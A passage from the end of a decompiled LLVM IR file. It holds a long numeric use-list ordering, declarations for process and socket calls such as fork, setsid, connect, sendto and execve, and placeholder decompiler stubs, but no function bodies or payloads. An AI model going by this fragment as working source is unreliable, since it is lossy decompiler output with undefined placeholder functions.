2028, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861, 1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1876, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 1893, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 1937, 1938, 1939, 1940, 1941, 1942, 1943, 1944, 1945, 1946, 3016, 3017, 3018, 3019, 3020, 3021, 3022, 3023, 3024, 3025, 3026, 3027, 3028, 3029, 3030 }
  uselistorder i32* @r4, { 92, 787, 304, 12, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 93, 94, 95, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 14, 330, 13, 331, 332, 333, 334, 335, 342, 15, 4, 368, 377, 378, 46, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 41, 413, 414, 415, 416, 417, 497, 422, 7, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 453, 454, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 532, 533, 534, 535, 536, 537, 538, 5, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 16, 18, 109, 17, 110, 113, 111, 112, 539, 540, 541, 542, 545, 2, 543, 544, 10, 42, 550, 546, 547, 548, 549, 551, 552, 455, 456, 19, 457, 458, 459, 460, 461, 462, 20, 463, 464, 465, 466, 467, 468, 469, 553, 554, 470, 471, 472, 473, 474, 475, 476, 477, 478, 555, 556, 557, 558, 114, 115, 116, 433, 434, 435, 391, 436, 437, 438, 439, 440, 441, 442, 443, 444, 21, 445, 446, 447, 448, 449, 450, 451, 452, 369, 370, 371, 791, 792, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 706, 707, 708, 793, 794, 22, 795, 796, 797, 575, 576, 577, 578, 579, 343, 344, 23, 6, 345, 226, 227, 228, 229, 230, 231, 580, 581, 582, 583, 584, 585, 586, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 24, 479, 491, 492, 480, 481, 482, 483, 484, 487, 488, 25, 489, 490, 485, 486, 493, 494, 495, 496, 346, 347, 348, 349, 47, 587, 588, 589, 590, 26, 591, 592, 593, 594, 27, 595, 596, 597, 28, 598, 599, 600, 601, 602, 603, 8, 610, 0, 611, 612, 498, 499, 500, 501, 502, 29, 503, 30, 31, 504, 505, 506, 507, 508, 509, 510, 32, 604, 605, 606, 3, 607, 418, 419, 420, 421, 613, 1, 372, 373, 374, 375, 376, 336, 337, 338, 339, 340, 341, 350, 351, 352, 33, 353, 354, 355, 34, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 117, 118, 119, 120, 121, 122, 123, 124, 125, 133, 134, 135, 136, 137, 126, 127, 128, 129, 11, 130, 131, 132, 138, 139, 140, 814, 251, 734, 735, 736, 718, 719, 141, 720, 721, 722, 716, 717, 815, 816, 817, 818, 723, 724, 737, 738, 252, 253, 254, 255, 256, 257, 261, 824, 832, 833, 834, 835, 848, 849, 850, 827, 828, 829, 830, 831, 819, 820, 821, 739, 740, 81, 82, 83, 84, 85, 86, 87, 262, 263, 264, 822, 823, 142, 143, 144, 145, 146, 147, 148, 149, 150, 48, 271, 272, 273, 274, 275, 288, 289, 153, 154, 155, 276, 277, 278, 279, 151, 152, 156, 157, 290, 291, 292, 293, 158, 159, 160, 161, 741, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 35, 760, 761, 762, 763, 764, 742, 743, 744, 765, 766, 767, 768, 769, 770, 771, 772, 44, 773, 774, 9, 775, 776, 40, 777, 36, 778, 779, 780, 781, 258, 259, 260, 529, 530, 531, 245, 246, 247, 265, 266, 782, 783, 695, 696, 301, 302, 303, 201, 202, 203, 527, 528, 686, 687, 688, 689, 690, 691, 37, 692, 693, 694, 836, 837, 838, 839, 840, 841, 842, 843, 614, 615, 616, 617, 38, 618, 619, 49, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 39, 677, 678, 679, 680, 681, 682, 88, 89, 90, 661, 662, 45, 43, 663, 683, 684, 685, 608, 609, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 50, 844, 845, 846, 847, 267, 268, 269, 270, 725, 726, 727, 825, 826, 174, 175, 176, 784, 785, 786, 789, 790, 713, 714, 715, 177, 178, 697, 698, 198, 199, 200, 294, 295, 296, 179, 728, 729, 730, 731, 732, 733, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 248, 249, 250, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 280, 281, 282, 283, 284, 285, 286, 287, 297, 298, 299, 300, 699, 700, 701, 702, 703, 704, 705, 709, 710, 711, 712, 91, 788 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @stat(i8*, %stat*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

declare i32* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { noreturn nounwind }
